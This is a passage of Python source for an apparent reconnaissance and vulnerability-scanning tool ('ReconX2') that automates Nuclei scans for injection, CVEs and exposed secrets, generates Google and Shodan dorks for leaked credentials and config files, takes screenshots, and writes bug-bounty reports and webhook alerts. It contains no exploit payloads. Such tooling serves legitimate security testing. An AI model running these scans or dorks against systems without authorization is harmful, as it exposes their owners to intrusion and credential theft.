- Fix CORS misconfiguration to restrict allowed origins
- Remove or restrict access to Swagger/GraphQL documentation
- Review and rotate any exposed API keys or JWT secrets

### Medium-term
- Implement Content Security Policy headers
- Enable HSTS preloading
- Add X-Frame-Options and X-Content-Type-Options headers
- Review all open redirect vulnerabilities

---
*Generated by ReconX2 v{VERSION} | Authorized security testing only*
"""

        # Save files
        md_path = f"{self.outdir}/reports/executive_summary.md"
        with open(md_path, "w") as f:
            f.write(summary_md)

        # Save risk score to DB
        self.db.set_meta("risk_score", str(score))
        self.db.set_meta("risk_label", risk_label)

        success(f"Risk score: {C.RED if score >= 50 else C.YELLOW}{score}/100 ({risk_label}){C.RESET}")
        info(f"Executive summary → {md_path}")
        self.db.mark_done("exec_summary")

    # --- MODULE 36: SLACK/DISCORD ALERTS ------------------------------------------
    async def send_alerts(self):
        section("MODULE 36 -- REAL-TIME ALERTS")
        if self._skip("alerts"): return

        slack_url   = os.environ.get("SLACK_WEBHOOK_URL", "")
        discord_url = os.environ.get("DISCORD_WEBHOOK_URL", "")

        if not slack_url and not discord_url:
            info("No SLACK_WEBHOOK_URL or DISCORD_WEBHOOK_URL set — skipping alerts")
            info("  Set env vars to receive real-time critical finding notifications")
            self.db.mark_done("alerts")
            return

        # Collect critical findings
        crit = self.db.conn.execute(
            "SELECT url, notes, risk_level FROM sensitive_paths "
            "WHERE risk_level IN ('CRITICAL','HIGH') ORDER BY "
            "CASE risk_level WHEN 'CRITICAL' THEN 1 ELSE 2 END LIMIT 20"
        ).fetchall()
        nuc_crit = self.db.conn.execute(
            "SELECT severity, template, url FROM nuclei_findings "
            "WHERE severity IN ('critical','high') LIMIT 10"
        ).fetchall()

        risk_score = self.db.get_meta("risk_score", "0")
        risk_label = self.db.get_meta("risk_label", "UNKNOWN")

        n_total_crit = len(crit) + len(nuc_crit)
        if n_total_crit == 0:
            info("No critical/high findings to alert on")
            self.db.mark_done("alerts")
            return

        loop = asyncio.get_event_loop()

        # ── Slack Notification ─────────────────────────────────────────────
        if slack_url:
            color = "#FF0000" if risk_label in ["CRITICAL","HIGH"] else "#FFA500"
            blocks = []

            # Header
            blocks.append({
                "type": "header",
                "text": {"type": "plain_text",
                         "text": f"ReconX2 Alert — {self.domain}"}
            })
            blocks.append({
                "type": "section",
                "fields": [
                    {"type": "mrkdwn", "text": f"*Risk Score:* {risk_score}/100"},
                    {"type": "mrkdwn", "text": f"*Risk Level:* {risk_label}"},
                    {"type": "mrkdwn", "text": f"*Critical/High:* {n_total_crit} findings"},
                    {"type": "mrkdwn", "text": f"*Target:* {self.domain}"},
                ]
            })

            # Top findings
            if crit:
                finding_text = "\n".join(
                    f"• *[{sev}]* `{url[:60]}`\n  {notes[:80]}"
                    for url, notes, sev in crit[:5]
                )
                blocks.append({
                    "type": "section",
                    "text": {"type": "mrkdwn",
                             "text": f"*Top Findings:*\n{finding_text}"}
                })

            payload = json.dumps({"blocks": blocks}).encode()

            def _slack():
                try:
                    req = urllib.request.Request(
                        slack_url, data=payload,
                        headers={"Content-Type": "application/json"},
                        method="POST"
                    )
                    with urllib.request.urlopen(req, timeout=10) as r:
                        return r.status == 200
                except Exception as e:
                    warn(f"Slack error: {e}")
                    return False

            ok = await loop.run_in_executor(None, _slack)
            if ok:
                success(f"Slack alert sent ({n_total_crit} findings)")

        # ── Discord Notification ───────────────────────────────────────────
        if discord_url:
            color_int = 0xFF0000 if risk_label in ["CRITICAL","HIGH"] else 0xFFA500

            fields = [
                {"name": "Risk Score", "value": f"{risk_score}/100 — **{risk_label}**", "inline": True},
                {"name": "Critical/High", "value": str(n_total_crit), "inline": True},
                {"name": "Subdomains", "value": str(self.db.count("subdomains")), "inline": True},
            ]

            for url, notes, sev in crit[:5]:
                fields.append({
                    "name": f"[{sev}] {url[:45]}",
                    "value": notes[:100],
                    "inline": False
                })

            embed = {
                "title": f"ReconX2 Scan Complete — {self.domain}",
                "color": color_int,
                "fields": fields,
                "footer": {"text": f"ReconX2 v{VERSION} | Authorized testing only"},
                "timestamp": __import__("datetime").datetime.utcnow().isoformat()
            }
            payload = json.dumps({"embeds": [embed]}).encode()

            def _discord():
                try:
                    req = urllib.request.Request(
                        discord_url, data=payload,
                        headers={"Content-Type": "application/json"},
                        method="POST"
                    )
                    with urllib.request.urlopen(req, timeout=10) as r:
                        return r.status in [200, 204]
                except Exception as e:
                    warn(f"Discord error: {e}")
                    return False

            ok = await loop.run_in_executor(None, _discord)
            if ok:
                success(f"Discord alert sent ({n_total_crit} findings)")

        self.db.mark_done("alerts")

    # --- MODULE 37: BUG BOUNTY MARKDOWN EXPORT ------------------------------------
    async def bug_bounty_export(self):
        section("MODULE 37 -- BUG BOUNTY MARKDOWN EXPORT")
        if self._skip("bugbounty"): return

        info("Generating bug bounty report templates...")
        bb_dir = f"{self.outdir}/reports/bug_bounty"
        os.makedirs(bb_dir, exist_ok=True)

        # Collect all findings sorted by severity
        findings = self.db.conn.execute("""
            SELECT url, status_code, risk_level, notes
            FROM sensitive_paths
            WHERE risk_level IN ('CRITICAL','HIGH','MEDIUM')
            ORDER BY CASE risk_level
                WHEN 'CRITICAL' THEN 1
                WHEN 'HIGH' THEN 2
                ELSE 3 END
        """).fetchall()

        nuc_findings = self.db.conn.execute("""
            SELECT severity, template, url, raw
            FROM nuclei_findings
            WHERE severity IN ('critical','high','medium')
            ORDER BY CASE severity
                WHEN 'critical' THEN 1
                WHEN 'high' THEN 2
                ELSE 3 END
        """).fetchall()

        CVSS_MAP = {
            "CRITICAL": "9.0-10.0 (Critical)",
            "HIGH":     "7.0-8.9 (High)",
            "MEDIUM":   "4.0-6.9 (Medium)",
        }

        IMPACT_MAP = {
            "Default cred":      "Full authenticated access to admin panel",
            "SSRF":              "Server-Side Request Forgery — access internal services and cloud metadata",
            "Zone Transfer":     "Complete internal DNS structure exposed",
            "403 BYPASS":        "Access to restricted resources bypassing authentication",
            "CORS":              "Cross-origin data theft — steal user data from victim browsers",
            "Open redirect":     "Phishing via trusted domain redirect, OAuth token theft",
            "JWT":               "Authentication bypass, session hijacking, privilege escalation",
            "GraphQL":           "API structure exposed, potential data exfiltration via introspection",
            "Cloud bucket":      "Sensitive data exposure from cloud storage misconfiguration",
            "Prototype":         "Prototype pollution — potential RCE or property injection",
            "DOM XSS":           "Cross-site scripting via DOM manipulation",
            "CRLF":              "HTTP response splitting, header injection, cache poisoning",
            "Default":           "Authentication bypass with default credentials",
            "Swagger":           "Full API documentation exposed — enables targeted attacks",
        }

        def _get_impact(notes):
            for key, impact in IMPACT_MAP.items():
                if key.lower() in str(notes).lower():
                    return impact
            return "Potential security impact — manual verification required"

        reports_generated = []

        # Generate individual report per finding
        for i, (url, code, sev, notes) in enumerate(findings[:20]):
            impact   = _get_impact(notes)
            cvss     = CVSS_MAP.get(sev, "4.0-6.9 (Medium)")
            title    = f"{sev}: {notes[:60]}" if notes else f"{sev} finding at {url}"

            report = f"""# {title}

## Summary
{notes}

**Target:** {url}
**Severity:** {sev}
**CVSS Score:** {cvss}
**HTTP Status:** {code}

## Steps to Reproduce

1. Navigate to the target: `{url}`
2. {notes}
3. Observe the response confirming the vulnerability

```
Request:
GET {url} HTTP/1.1
Host: {self.domain}
User-Agent: Mozilla/5.0

Response:
HTTP/1.1 {code}
[See raw output in scan directory]
```

## Impact

{impact}

An attacker who successfully exploits this vulnerability could:
- Access sensitive information or functionality
- Escalate privileges or bypass authentication controls
- Compromise user data or system integrity

## Proof of Concept

[Attach screenshots and raw HTTP traffic from scan directory]

## Remediation

### Short-term
- Immediately restrict access to `{url}`
- Review server configuration for this endpoint

### Long-term
- Implement proper authentication and authorization
- Apply the principle of least privilege
- Regular security testing and code review

## References
- OWASP Testing Guide
- CWE/CVE database

---
*Found by ReconX2 v{VERSION} — Authorized security testing only*
"""
            safe_name = re.sub(r"[^a-zA-Z0-9_-]", "_", f"{sev}_{i+1}_{notes[:30]}")[:60]
            report_path = f"{bb_dir}/{safe_name}.md"
            with open(report_path, "w") as f:
                f.write(report)
            reports_generated.append(report_path)

        # Also generate nuclei finding reports
        for i, (sev, template, url, raw) in enumerate(nuc_findings[:10]):
            title = template[:80].strip()
            cvss  = CVSS_MAP.get(sev.upper(), "4.0-6.9 (Medium)")

            report = f"""# {sev.upper()}: {title}

## Summary
Nuclei detected **{title}** at the target endpoint.

**Target:** {url}
**Template:** {template}
**Severity:** {sev.upper()}
**CVSS Score:** {cvss}

## Steps to Reproduce

1. Run nuclei against target: `nuclei -u {url} -tags {template.split('[')[0].strip()}`
2. Verify the finding manually using the raw output below

## Raw Nuclei Output
```
{(raw or '').strip()[:500]}
```

## Impact

This vulnerability could allow an attacker to compromise the confidentiality,
integrity, or availability of the application and its data.

## Remediation

Apply the relevant security patch or configuration fix as described in the
nuclei template documentation.

---
*Found by ReconX2 v{VERSION} | Template: {template[:60]}*
"""
            safe_name = re.sub(r"[^a-zA-Z0-9_-]", "_", f"nuclei_{sev}_{i+1}_{title[:25]}")[:60]
            report_path = f"{bb_dir}/{safe_name}.md"
            with open(report_path, "w") as f:
                f.write(report)
            reports_generated.append(report_path)

        success(f"Bug bounty: {C.GREEN}{len(reports_generated)}{C.RESET} report templates → {bb_dir}/")
        self.db.mark_done("bugbounty")

    # --- MODULE 38: PDF REPORT EXPORT ---------------------------------------------
    async def pdf_export(self):
        section("MODULE 38 -- PDF REPORT EXPORT")
        if self._skip("pdf_export"): return

        html_path = f"{self.outdir}/reports/reconx2_report_{self.domain}.html"
        pdf_path  = f"{self.outdir}/reports/reconx2_report_{self.domain}.pdf"

        if not os.path.exists(html_path):
            warn("HTML report not found — generate reports first")
            self.db.mark_done("pdf_export")
            return

        # Try chromium/chrome headless PDF generation
        browser = (tool_resolve("chromium") or
                   tool_resolve("chromium-browser") or
                   tool_resolve("google-chrome"))

        if browser:
            info(f"Generating PDF via {browser}...")
            out = await run_cmd([
                browser,
                "--headless=new",
                "--disable-gpu",
                "--no-sandbox",
                "--disable-dev-shm-usage",
                f"--print-to-pdf={pdf_path}",
                "--print-to-pdf-no-header",
                "--run-all-compositor-stages-before-draw",
                "--virtual-time-budget=5000",
                f"file://{os.path.abspath(html_path)}"
            ], timeout=60, capture_stderr=True)

            if os.path.exists(pdf_path) and os.path.getsize(pdf_path) > 1000:
                size_mb = os.path.getsize(pdf_path) / (1024*1024)
                success(f"PDF report → {pdf_path} ({size_mb:.1f}MB)")
            else:
                # Fallback: try wkhtmltopdf
                if tool_exists("wkhtmltopdf"):
                    info("Trying wkhtmltopdf fallback...")
                    await run_cmd([
                        "wkhtmltopdf", "--quiet",
                        "--enable-local-file-access",
                        html_path, pdf_path
                    ], timeout=120)
                    if os.path.exists(pdf_path):
                        success(f"PDF (wkhtmltopdf) → {pdf_path}")
                    else:
                        warn("PDF generation failed")
                else:
                    warn(f"PDF failed — chromium error: {out[:150]}")
                    info("Install wkhtmltopdf: sudo apt install -y wkhtmltopdf")
        else:
            warn("No chromium/chrome found for PDF export")
            info("Install: sudo apt install -y chromium")

        self.db.mark_done("pdf_export")

    # --- MODULE 39: SCAN DIFF / COMPARE -------------------------------------------
    async def scan_diff(self):
        section("MODULE 39 -- SCAN DIFF / COMPARE")
        if self._skip("scan_diff"): return

        # Look for previous scans of same domain
        prev_dir = os.environ.get("RECONX2_PREV_SCAN", "")
        if not prev_dir:
            # Auto-detect: find most recent other scan of same domain
            parent = os.path.dirname(self.outdir) or "."
            try:
                candidates = sorted([
                    d for d in os.listdir(parent)
                    if self.domain in d
                    and os.path.join(parent,d) != self.outdir
                    and os.path.isdir(os.path.join(parent,d))
                ], reverse=True)
                if candidates:
                    prev_dir = os.path.join(parent, candidates[0])
            except Exception:
                pass

        if not prev_dir or not os.path.exists(prev_dir):
            info("No previous scan found for diff")
            info("  Set RECONX2_PREV_SCAN=/path/to/previous/scan to compare")
            self.db.mark_done("scan_diff")
            return

        info(f"Comparing with previous scan: {C.CYAN}{prev_dir}{C.RESET}")

        prev_db_path = f"{prev_dir}/reconx2.db"
        if not os.path.exists(prev_db_path):
            warn("Previous scan has no database — skipping diff")
            self.db.mark_done("scan_diff")
            return

        prev_db = DB(prev_db_path)

        # Compare subdomains
        curr_subs = set(self.db.get_subdomains())
        prev_subs = set(prev_db.get_subdomains())
        new_subs  = curr_subs - prev_subs
        gone_subs = prev_subs - curr_subs

        # Compare live hosts
        curr_live = set(self.db.get_live_urls())
        prev_live = set(prev_db.get_live_urls())
        new_live  = curr_live - prev_live
        gone_live = prev_live - curr_live

        # Compare findings
        curr_findings = set(
            (r[0], r[2]) for r in self.db.conn.execute(
                "SELECT url, status_code, risk_level FROM sensitive_paths"
            ).fetchall()
        )
        prev_findings = set(
            (r[0], r[2]) for r in prev_db.conn.execute(
                "SELECT url, status_code, risk_level FROM sensitive_paths"
            ).fetchall()
        )
        new_findings  = curr_findings - prev_findings
        fixed_findings = prev_findings - curr_findings

        # Compare nuclei
        curr_nuc = set(
            (r[0], r[1]) for r in self.db.conn.execute(
                "SELECT severity, template FROM nuclei_findings"
            ).fetchall()
        )
        prev_nuc = set(
            (r[0], r[1]) for r in prev_db.conn.execute(
                "SELECT severity, template FROM nuclei_findings"
            ).fetchall()
        )
        new_nuc   = curr_nuc - prev_nuc
        fixed_nuc = prev_nuc - curr_nuc

        prev_db.close()

        # Print diff summary
        if new_subs:
            warn(f"  {C.RED}+{len(new_subs)}{C.RESET} NEW subdomains")
        if gone_subs:
            info(f"  -{len(gone_subs)} subdomains no longer found")
        if new_live:
            warn(f"  {C.ORANGE}+{len(new_live)}{C.RESET} NEW live hosts")
        if new_findings:
            warn(f"  {C.RED}+{len(new_findings)}{C.RESET} NEW security findings")
        if fixed_findings:
            success(f"  -{len(fixed_findings)} findings appear fixed")
        if new_nuc:
            warn(f"  {C.RED}+{len(new_nuc)}{C.RESET} NEW nuclei findings")
        if fixed_nuc:
            success(f"  -{len(fixed_nuc)} nuclei findings appear resolved")

        # Write diff report
        diff_path = f"{self.outdir}/reports/scan_diff.md"
        with open(diff_path, "w") as f:
            f.write(f"# Scan Diff Report\n\n")
            f.write(f"**Current scan:** {self.outdir}\n")
            f.write(f"**Previous scan:** {prev_dir}\n")
            f.write(f"**Target:** {self.domain}\n\n")

            f.write("## Summary\n\n")
            f.write(f"| Change | Count |\n|--------|-------|\n")
            f.write(f"| New subdomains | +{len(new_subs)} |\n")
            f.write(f"| Lost subdomains | -{len(gone_subs)} |\n")
            f.write(f"| New live hosts | +{len(new_live)} |\n")
            f.write(f"| Lost live hosts | -{len(gone_live)} |\n")
            f.write(f"| New findings | +{len(new_findings)} |\n")
            f.write(f"| Fixed findings | -{len(fixed_findings)} |\n")
            f.write(f"| New nuclei | +{len(new_nuc)} |\n")
            f.write(f"| Fixed nuclei | -{len(fixed_nuc)} |\n\n")

            if new_subs:
                f.write("## New Subdomains\n")
                for s in sorted(new_subs)[:50]:
                    f.write(f"- `{s}`\n")
                f.write("\n")
            if new_findings:
                f.write("## New Security Findings\n")
                for url, sev in sorted(new_findings, key=lambda x: x[1])[:20]:
                    f.write(f"- **[{sev}]** {url}\n")
                f.write("\n")
            if fixed_findings:
                f.write("## Fixed/Resolved Findings\n")
                for url, sev in list(fixed_findings)[:20]:
                    f.write(f"- ~~[{sev}] {url}~~\n")
                f.write("\n")
            if new_nuc:
                f.write("## New Nuclei Findings\n")
                for sev, tpl in sorted(new_nuc, key=lambda x: x[0])[:20]:
                    f.write(f"- **[{sev}]** {tpl[:80]}\n")

        success(f"Scan diff complete → {diff_path}")
        self.db.mark_done("scan_diff")


    # ─── MODULE 10: SCREENSHOTS ───────────────────────────────────────────
    async def screenshots(self):
        if self.skip_heavy:
            warn("Screenshots skipped (--skip-heavy)")
            return
        section("MODULE 10 — SCREENSHOTS")
        if self._skip("screenshots"): return

        live_file = f"{self.outdir}/subdomains/live_urls.txt"
        ss_dir    = f"{self.outdir}/screenshots"
        os.makedirs(ss_dir, exist_ok=True)

        if not os.path.exists(live_file) or os.path.getsize(live_file) == 0:
            warn("No live hosts — skipping screenshots")
            return

        live_urls = read_file(live_file)
        info(f"Taking screenshots of {len(live_urls)} live hosts...")

        def has_shots():
            try:
                return [f for f in os.listdir(ss_dir)
                        if f.lower().endswith((".png",".jpg",".jpeg"))]
            except Exception:
                return []

        # Resolve chromium FIRST — both gowitness and direct fallback need it
        chrome_path = (
            tool_resolve("chromium") or
            tool_resolve("chromium-browser") or
            tool_resolve("google-chrome") or
            tool_resolve("chromium-browser-bin") or
            "/usr/bin/chromium"  # Kali default
        )
        if os.path.isfile(chrome_path) and os.access(chrome_path, os.X_OK):
            info(f"  chromium found at: {chrome_path}")
        else:
            chrome_path = ""
            warn("  chromium NOT found — screenshots may fail")
            warn("  Fix: sudo apt install -y chromium")

        tool_used = None
        gw_path   = tool_resolve("gowitness")
        db_path   = f"{ss_dir}/gowitness.db"

        if gw_path:
            tool_used = "gowitness"
            ver = await run_cmd([gw_path, "--version"],
                                timeout=8, capture_stderr=True)
            is_v3 = any(x in ver.lower() for x in ["3.", "v3", " 3"])
            info(f"  gowitness {'v3' if is_v3 else 'v2'} at {gw_path}")

            if is_v3:
                # v3: always pass --chrome-path and --db-path explicitly
                # to avoid "chrome not found" and permission errors
                base = [gw_path, "scan", "file",
                        "-f", live_file,
                        "--screenshot-path", ss_dir,
                        "--db-path", db_path,
                        "--timeout", "15",
                        "--threads", "8"]
                if chrome_path:
                    base += ["--chrome-path", chrome_path]

                # Try variations for different v3 builds
                for n, extra in enumerate([
                    [],
                    ["--disable-sandbox"],
                    ["--no-sandbox"],
                ]):
                    if has_shots(): break
                    info(f"  v3 attempt {n+1}...")
                    out = await run_cmd(base + extra, timeout=600,
                                       capture_stderr=True)
                    if out and len(out) > 5:
                        # Show first meaningful line of output
                        first = next((l for l in out.splitlines() if l.strip()), "")
                        if first: info(f"  gowitness: {first[:120]}")
            else:
                out = await run_cmd([
                    gw_path, "file", "-f", live_file,
                    "--destination", ss_dir + "/",
                    "--threads", "8", "--timeout", "15", "--delay", "1",
                ], timeout=600, capture_stderr=True)
                if out and not has_shots():
                    warn(f"  gowitness v2: {out[:150]}")
                if not has_shots():
                    gw_sem = asyncio.Semaphore(5)
                    async def _gw(u):
                        async with gw_sem:
                            await run_cmd([
                                gw_path,"single",u,
                                "--destination",ss_dir+"/","--timeout","15",
                            ], timeout=25)
                    info("  v2 single-URL mode...")
                    await asyncio.gather(*[_gw(u) for u in live_urls[:30]])

        # aquatone fallback
        aq_path = tool_resolve("aquatone")
        if not has_shots() and aq_path:
            tool_used = "aquatone"
            info(f"Using aquatone at {aq_path}")
            live_str = "\n".join(live_urls)
            await run_cmd([aq_path,"-out",ss_dir,
                           "-threads","5","-timeout","30000"],
                          timeout=600, stdin_data=live_str)

        # Chromium headless direct (most reliable on Kali)
        if not has_shots():
            if chrome_path:
                tool_used = "chromium"
                info(f"Using chromium headless directly: {chrome_path}")
                cr_sem = asyncio.Semaphore(3)
                async def _cr(url):
                    async with cr_sem:
                        safe = re.sub(r"[^a-zA-Z0-9._-]","_",url)[:80]
                        out  = os.path.join(ss_dir, safe+".png")
                        for hf in ["--headless=new","--headless"]:
                            err = await run_cmd([
                                chrome_path, hf,
                                "--disable-gpu","--no-sandbox",
                                "--disable-dev-shm-usage",
                                "--disable-extensions",
                                "--disable-background-networking",
                                f"--screenshot={out}",
                                "--window-size=1366,768",
                                "--virtual-time-budget=8000",
                                url,
                            ], timeout=30, capture_stderr=True)
                            if os.path.exists(out) and os.path.getsize(out) > 500:
                                return  # success
                await asyncio.gather(*[_cr(u) for u in live_urls[:50]])
            else:
                warn("  No chromium found. Install: sudo apt install -y chromium")

        shots = has_shots()
        n     = len(shots)
        self.db.set_meta("screenshot_count", str(n))
        self.db.set_meta("screenshot_tool",  tool_used or "none")
        if n > 0:
            success(f"Screenshots: {C.GREEN}{n}{C.RESET} captured via {tool_used}")
        else:
            warn(f"0 screenshots.")
            warn(f"  gowitness : {gw_path or 'NOT FOUND'}")
            warn(f"  chromium  : {chrome_path or 'NOT FOUND'}")
            warn(f"  Manual    : gowitness scan file -f {live_file}")
            warn(f"              --screenshot-path {ss_dir}")
            if chrome_path:
                warn(f"              --chrome-path {chrome_path}")
        self.db.mark_done("screenshots")

    # ─── MODULE 11: NUCLEI ────────────────────────────────────────────────
    async def nuclei_scan(self):
        if self.skip_heavy:
            warn("Nuclei skipped (--skip-heavy)")
            return
        section("MODULE 11 — NUCLEI VULNERABILITY SCAN")
        if self._skip("nuclei"): return

        live_file = f"{self.outdir}/subdomains/live_urls.txt"
        if not tool_exists("nuclei"):
            warn("nuclei not found — skipping")
            return
        if not os.path.exists(live_file):
            warn("No live hosts for nuclei")
            return

        nuc_out       = f"{self.outdir}/raw/nuclei_findings.txt"
        # Per-pass files — CRITICAL: avoids overwrite bug
        nuc_pass_dir  = f"{self.outdir}/raw"
        nuc_pass_files = [f"{nuc_pass_dir}/nuclei_pass{i}.txt" for i in range(1, 9)]

        # ── Build max surface area target list ────────────────────────────
        nuc_targets = set()
        for u in read_file(live_file):
            nuc_targets.add(u.strip())
        for u in read_file(f"{self.outdir}/params/urls_with_params.txt")[:5000]:
            nuc_targets.add(u.strip())
        for u in read_file(f"{self.outdir}/files/interesting_files.txt"):
            nuc_targets.add(u.strip())
        for u in read_file(f"{self.outdir}/files/sensitive_paths.txt"):
            m = re.search(r"https?://\S+", u)
            if m: nuc_targets.add(m.group())
        for u in read_file(f"{self.outdir}/files/dynamic_endpoints.txt"):
            nuc_targets.add(u.strip())

        nuc_targets_file = f"{self.outdir}/raw/nuclei_targets.txt"
        write_file(nuc_targets_file, sorted(nuc_targets))
        info(f"Nuclei: {C.CYAN}{len(nuc_targets)}{C.RESET} targets | 8 passes")

        def nb(n):
            """Base nuclei flags + unique per-pass output file."""
            return [
                "nuclei",
                "-rl",  "30",
                "-c",   "10",
                "-bs",  "20",
                "-timeout", "8",
                "-retries", "1",
                "-silent",
                "-no-color",
                "-o",   nuc_pass_files[n-1],
            ]

        # ── PASS 1: Exposures + misconfigs + takeovers ────────────────────
        info(f"Nuclei {C.CYAN}[1/8]{C.RESET} exposures, misconfigs, default creds...")
        await run_cmd(nb(1) + [
            "-l", nuc_targets_file,
            "-tags", "exposure,misconfig,takeover,default-login,auth-bypass,panel,backup",
            "-severity", "info,low,medium,high,critical",
        ], timeout=900)

        # ── PASS 2: Injections on param URLs ──────────────────────────────
        param_f = f"{self.outdir}/params/urls_with_params.txt"
        info(f"Nuclei {C.CYAN}[2/8]{C.RESET} SQLi, XSS, SSRF, LFI, RCE on param URLs...")
        if os.path.exists(param_f) and os.path.getsize(param_f) > 0:
            await run_cmd(nb(2) + [
                "-l", param_f,
                "-tags", "sqli,xss,ssrf,lfi,rce,redirect,ssti,xxe",
                "-severity", "low,medium,high,critical",
            ], timeout=600)

        # ── PASS 3: CVEs ──────────────────────────────────────────────────
        info(f"Nuclei {C.CYAN}[3/8]{C.RESET} CVEs (all years)...")
        await run_cmd(nb(3) + [
            "-l", live_file,
            "-tags", "cve",
            "-severity", "medium,high,critical",
        ], timeout=900)

        # ── PASS 4: Tech-specific templates ───────────────────────────────
        info(f"Nuclei {C.CYAN}[4/8]{C.RESET} technology-specific templates...")
        etags = "technologies"
        try:
            tech_raw = open(f"{self.outdir}/tech/whatweb_brief.txt").read().lower()
            for tech, tag in [
                ("wordpress","wordpress"), ("drupal","drupal"), ("joomla","joomla"),
                ("laravel","laravel"),     ("spring","spring"), ("struts","struts"),
                ("nginx","nginx"),         ("apache","apache"), ("php","php"),
                ("node","node.js"),        ("graphql","graphql"),("jenkins","jenkins"),
                ("tomcat","tomcat"),       ("elasticsearch","elasticsearch"),
                ("kibana","kibana"),       ("jira","jira"),     ("confluence","confluence"),
                ("iis","iis"),             ("weblogic","weblogic"),("jquery","jquery"),
            ]:
                if tech in tech_raw: etags += f",{tag}"
        except Exception: pass
        await run_cmd(nb(4) + [
            "-l", live_file,
            "-tags", etags,
            "-severity", "medium,high,critical",
        ], timeout=600)

        # ── PASS 5: JS files for secrets ──────────────────────────────────
        js_f = f"{self.outdir}/js/js_files.txt"
        info(f"Nuclei {C.CYAN}[5/8]{C.RESET} JS files for tokens/secrets...")
        if os.path.exists(js_f) and os.path.getsize(js_f) > 0:
            await run_cmd(nb(5) + [
                "-l", js_f,
                "-tags", "exposure,token,secret,keys,aws,api,firebase,stripe,github",
                "-severity", "info,low,medium,high,critical",
            ], timeout=600)

        # ── PASS 6: Headers, SSL, CORS ────────────────────────────────────
        info(f"Nuclei {C.CYAN}[6/8]{C.RESET} headers, SSL, CORS, CSP misconfigs...")
        await run_cmd(nb(6) + [
            "-l", live_file,
            "-tags", "headers,ssl,cors,csp,hsts,clickjacking,misconfiguration",
            "-severity", "info,low,medium,high",
        ], timeout=300)

        # ── PASS 7: Subdomain takeover ────────────────────────────────────
        info(f"Nuclei {C.CYAN}[7/8]{C.RESET} subdomain takeover on all subdomains...")
        all_subs = read_file(f"{self.outdir}/subdomains/all_subdomains.txt")
        if all_subs:
            sub_url_file = f"{self.outdir}/raw/subdomain_urls_for_nuclei.txt"
            write_file(sub_url_file, [f"https://{s}" for s in all_subs if s])
            await run_cmd(nb(7) + [
                "-l", sub_url_file,
                "-tags", "takeover,dns",
                "-severity", "medium,high,critical",
            ], timeout=600)

        # ── PASS 8: Fuzz discovered endpoints ─────────────────────────────
        info(f"Nuclei {C.CYAN}[8/8]{C.RESET} fuzzing brute-forced endpoints...")
        fuzz_urls = set()
        for ff in [f"{self.outdir}/files/ffuf_dirs.json",
                   f"{self.outdir}/files/gobuster_dirs.txt",
                   f"{self.outdir}/files/feroxbuster.txt"]:
            if os.path.exists(ff):
                for line in read_file(ff):
                    u = re.search(r"https?://\S+", line)
                    if u: fuzz_urls.add(u.group())
        if fuzz_urls:
            fuzz_file = f"{self.outdir}/raw/fuzz_endpoints.txt"
            write_file(fuzz_file, list(fuzz_urls))
            await run_cmd(nb(8) + [
                "-l", fuzz_file,
                "-tags", "exposure,misconfig,panel,default-login",
                "-severity", "info,low,medium,high,critical",
            ], timeout=300)

        # ── Merge all 8 pass files → single deduplicated output ───────────
        seen_lines = set(); merged_lines = []
        passes_with_data = 0
        for pf in nuc_pass_files:
            if os.path.exists(pf) and os.path.getsize(pf) > 0:
                passes_with_data += 1
                for line in open(pf).readlines():
                    if line.strip() and line.strip() not in seen_lines:
                        seen_lines.add(line.strip())
                        merged_lines.append(line)
        with open(nuc_out, "w") as f:
            f.writelines(merged_lines)
        info(f"  Merged {C.GREEN}{len(merged_lines)}{C.RESET} findings from {passes_with_data}/8 passes")

        # ── Parse and store in DB ──────────────────────────────────────────
        for line in read_file(nuc_out):
            sev = "info"
            for s in ["critical","high","medium","low","info"]:
                if s in line.lower(): sev = s; break
            url_m = re.search(r"https?://\S+", line)
            url   = url_m.group(0) if url_m else ""
            tpl   = re.sub(r"\s*https?://\S*", "", line).strip()
            self.db.add_nuclei(sev, tpl[:200], url, line)

        count = self.db.count("nuclei_findings")
        success(f"Nuclei findings: {C.BOLD}{count}{C.RESET}")
        self.db.mark_done("nuclei")

    # ─── MODULE 12: GOOGLE DORKS ─────────────────────────────────────────
    async def generate_dorks(self):
        section("MODULE 12 — GOOGLE DORKS & OSINT")
        dorks = f"""Google Dorks for: {self.domain}
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{'='*54}

[EXPOSED FILES & CONFIGURATION]
site:{self.domain} filetype:env
site:{self.domain} filetype:sql
site:{self.domain} filetype:xml
site:{self.domain} filetype:json
site:{self.domain} filetype:log
site:{self.domain} filetype:cfg OR filetype:conf OR filetype:config
site:{self.domain} filetype:bak OR filetype:backup OR filetype:old
site:{self.domain} filetype:pdf intitle:"confidential"
site:{self.domain} filetype:xlsx OR filetype:xls OR filetype:csv

[ADMIN & LOGIN PANELS]
site:{self.domain} inurl:admin
site:{self.domain} inurl:login
site:{self.domain} inurl:dashboard
site:{self.domain} inurl:portal
site:{self.domain} inurl:wp-admin
site:{self.domain} inurl:administrator
site:{self.domain} inurl:control-panel
site:{self.domain} inurl:manage
site:{self.domain} inurl:cpanel

[SENSITIVE CONTENT]
site:{self.domain} intext:password
site:{self.domain} intext:"api_key" OR intext:"apikey" OR intext:"api_secret"
site:{self.domain} intext:"private key" OR intext:"secret key"
site:{self.domain} intext:"Authorization: Bearer"
site:{self.domain} intext:"username" intext:"password"
site:{self.domain} intext:"access_token" OR intext:"auth_token"

[SUBDOMAINS & DEVELOPMENT]
site:*.{self.domain}
site:{self.domain} inurl:dev OR inurl:staging OR inurl:test OR inurl:beta OR inurl:uat
site:{self.domain} inurl:api OR inurl:v1 OR inurl:v2 OR inurl:graphql
site:{self.domain} intitle:"index of"
site:{self.domain} intitle:"phpinfo"
site:{self.domain} inurl:debug OR inurl:debugger OR inurl:trace

[CODE & SECRET LEAKS — Run on GitHub / GitLab]
"{self.domain}" site:github.com
"{self.domain}" site:gitlab.com
"{self.domain}" site:bitbucket.org
"{self.domain}" site:pastebin.com
"{self.domain}" "api_key" site:github.com
"{self.domain}" "password" site:github.com
"{self.domain}" "secret" site:github.com
"{self.domain}" "token" site:github.com

[CLOUD STORAGE BUCKETS]
site:s3.amazonaws.com "{self.domain}"
site:blob.core.windows.net "{self.domain}"
site:storage.googleapis.com "{self.domain}"
"{self.domain}".s3.amazonaws.com

[SHODAN DORKS — Run at shodan.io]
hostname:{self.domain}
ssl:"{self.domain}"
http.title:"{self.domain}"
http.html:"{self.domain}"
org:"{self.domain.split('.')[0]}"
"""
        with open(f"{self.outdir}/raw/google_dorks.txt","w") as f: f.write(dorks)
        log("Google dorks → raw/google_dorks.txt")

        # ── Passive OSINT API queries (no auth needed) ─────────────────
        info("Running passive OSINT queries...")

